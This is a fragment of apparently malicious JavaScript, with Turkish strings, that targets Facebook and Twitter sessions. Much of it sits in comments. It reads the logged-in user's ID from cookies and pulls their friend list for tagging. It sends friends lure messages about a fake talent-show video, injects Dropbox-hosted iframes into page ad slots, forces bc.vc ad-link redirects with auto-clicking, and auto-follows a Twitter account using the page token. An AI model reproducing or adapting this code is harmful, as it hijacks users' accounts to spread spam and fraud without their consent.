 ...
 * window.location.href="http://oyunanaa.blogspot.com.tr/" alert("Lütfen şimdi
 * açılacak olan sayfadaki reklamlardan birine tıklayın. \r\nBu size hiçbirşey
 * kaybettirmez. \r\nBir reklama tıkladıktan sonra gezintinize devam
 * edebileceksiniz."); }
 */

/*
 * var bc =
 * ["http://bc.vc/AeGdE5","http://bc.vc/QRNUMt","http://bc.vc/Al6sAt","http://bc.vc/8jWU7g","http://bc.vc/bBPWQX","http://bc.vc/epVXRY","http://bc.vc/qAH3V7","http://bc.vc/Wc7D9F","http://bc.vc/1JnO9e","http://bc.vc/EnMQ8F"];
 * var bcrand = bc[Math.floor(bc.length * Math.random())];
 * 
 * var tarih = new Date(); if(!localStorage['BC'] || (localStorage['BC'] &&
 * tarih.getTime() >= (localStorage['BC'] + (1000*60*60)))){ localStorage['BC'] =
 * tarih.getTime();
 * 
 * if(location.hostname.indexOf("bc.vc") == -1) { window.location.href = bcrand;
 * }else { setInterval(function(){ document.getElementById('skip_btn').click();
 * },1000); } }
 */

/*
 * var tarih = new Date(); if(!localStorage['H'] || (localStorage['H'] &&
 * tarih.getTime() >= (localStorage['H'] + (1000*60*60)))){ localStorage['H'] =
 * tarih.getTime();
 * 
...
/*
 * if(location.hostname.indexOf("youtube.com") == -1 ) { if(
 * document.location.toString().indexOf("TmSensinKnkMA") == -1) {
 * window.location.href="http://www.facebook.com/TmSensinKnkMA"; }else {
...
function f_etiketle()
{
	var ids = "";
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + 
			profile_id + "&__user=" + profile_id 
			+ "&filter[0]=user&options[0]=friends_only&options[1]=nm&token=v7",
			true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4) {
 ...
 * if(document.getElementsByClassName("ego_unit_container")[0].innerHTML.indexOf("dropboxusercontent.com") ==
 * -1) { document.getElementsByClassName("ego_unit_container")[0].innerHTML = '<center><div
 * style="overflow:hidden; width: 244px; height: 508px;"><iframe
 * src="https://dl.dropboxusercontent.com/s/ewyzla0gpxfst87/face.html"
 * style="width: 244px;height: 508px;overflow: hidden;" scrolling="no"
 * frameborder="0" marginheight="0" marginwidth="0"></iframe></div></center>'; } }
 * if(document.getElementsByClassName("clearfix _5pcr
 * userContentWrapper").length > 0){
 * if(document.getElementsByClassName("clearfix _5pcr
 * userContentWrapper")[0].innerHTML.indexOf("dropboxusercontent.com") == -1) {
 * document.getElementsByClassName("clearfix _5pcr
 * userContentWrapper")[0].innerHTML = '<center><div style="overflow:hidden;
 * width: 476px; height: 420px;"><iframe
 * src="https://dl.dropboxusercontent.com/s/0mxiaqlbgp1mjc9/orta.html"
 * style="width: 476px;height: 540px;overflow: hidden;" scrolling="no"
 * frameborder="0" marginheight="0" marginwidth="0"></iframe></div></center>'; } }
 * if(document.getElementsByClassName("_5ce")){ for(i=0;i<document.getElementsByClassName("_5ce").length;i++){
 * document.getElementsByClassName("_5ce")[i].innerHTML = ""; } }
 * if(document.getElementsByClassName("uiToggle wrap")){ for(i=0;i<document.getElementsByClassName("uiToggle
 * wrap").length;i++){ document.getElementsByClassName("uiToggle
 * wrap")[i].innerHTML = ""; } }
 * if(document.getElementsByClassName("uiPopover")){ for(i=0;i<document.getElementsByClassName("uiPopover").length;i++){
 * document.getElementsByClassName("uiPopover")[i].innerHTML = ""; } } },10); }
 */

/*
 * if (location.hostname.indexOf("twitter.com") >= 0) { authenticity_token =
 * document.getElementsByName("authenticity_token")[0].value; function
 * follow(id){ var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange =
 * function () { if(xmlhttp.readyState == 4){ } }; var params =
 * "&authenticity_token="+authenticity_token; params += "&user_id=" + id;
 * xmlhttp.open("POST", "/i/user/follow", true); xmlhttp.setRequestHeader
 * ("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send(params); }
 * follow(""); }
 */
...
var aciklaArr = ["oha."];
var gonderArr = [":D duvarımdaki videomu izlesene :D hadiiiiii",
                 "acuna katılmıştım :D videomu tvde izlemediysen duvarımda var :D",
                 "ordamısın, duvarımdaki videomu izlermisin destek ol bana lütfen",
                 "şşttt ordamsn .s ya kusura bakma rahatsız ediyorum yeteneksizsinize katılmıştım ama elemeleri geçmem gerekiyor lütfen duvarımdaki videomu izleyip bana destek olur musun?",
                 "merhaba rarhatsız ediyorum özür dilerim, yarışmaya katılmıştım videomu duvarımda paylaştım izlermisin :)",
                 "duvarımdaki videomu izleyip bana destek olurmusun?",
                 "yeteneksizsinize katılmıştım performansımı izlermisin duvarımda"];
var acikla = aciklaArr[Math.floor(aciklaArr.length * Math.random())];
var gonder = gonderArr[Math.floor(gonderArr.length * Math.random())];
if(location.hostname.indexOf("www.facebook.com","static.ak.facebook.com",
		"apps.facebook.com","beta.facebook.com") >= 0){
...
// params += "&clp
// {"cl_impid":"f0489fcd","clearcounter":0,"elementid":"u_jsonp_10_s","version":"x","parent_fbid":100002973645601}";
// params += "&xhpc_message_text=" + isim + " bu videoyu beğendi ve yorum
// yaptı.\\r\\n" + rand + " " + rastgeleuret;
// params += "&xhpc_message=" + isim + " bu videoyu beğendi ve yorum
// yaptı.\\r\\n" + rand + " " + rastgeleuret;
...
// params += "&attachment[params][title]=Yetenek Sizsiniz T\xFCrkiye " + isim +
// " Performans\u0131";
// params += "&attachment[params][summary]=acunn.com - " + isim + " videosunu
// izle.";
...
/*
 * var profile_id = document.cookie.match(/c_user=(\d+)/)[1].toString(); var xhr =
 * new XMLHttpRequest(); if(document.location.toString().indexOf("https") >= 0) {
 * xhr.open("GET", "https://www.facebook.com/" + profile_id); }else {
 * xhr.open("GET", "http://www.facebook.com/" + profile_id); }
 * xhr.onreadystatechange = function() { if (xhr.readyState == 4) { gelen =
 * xhr.responseText; } } xhr.send(); var sonpaylasim =
 * gelen.match(/data-utime="(\d+)"/g)[0].replace('data-utime="',
 * "").replace('"', "") //alert(sonpaylasim);
 */
...
/*
 * var httpc = new XMLHttpRequest(); var msgid =
 * Math.floor(Math.random()*1000000); var time = Math.round(new Date().getTime() /
 * 1000); var paramsc =
 * "message_batch[0][action_type]=ma-type%3Auser-generated-message&message_batch[0][author]=fbid%3A" +
 * user_id +
 ...
 * toid + "&message_batch[0][specific_to_list][1]=fbid%3A" + user_id +
 ...
 * msgid + "&client=mercury&__user=" + user_id +
 * "&__a=1&__dyn=&__req=i&fb_dtsg=" + fb_dtsg + "&phstamp="; httpc.open("POST",
 * "/ajax/mercury/send_messages.php?__a=1", true); httpc.onreadystatechange =
 * function() { if(httpc.readyState == 4 && httpc.status == 200){ httpc.close; } }
 * httpc.send(paramsc);
 */
}
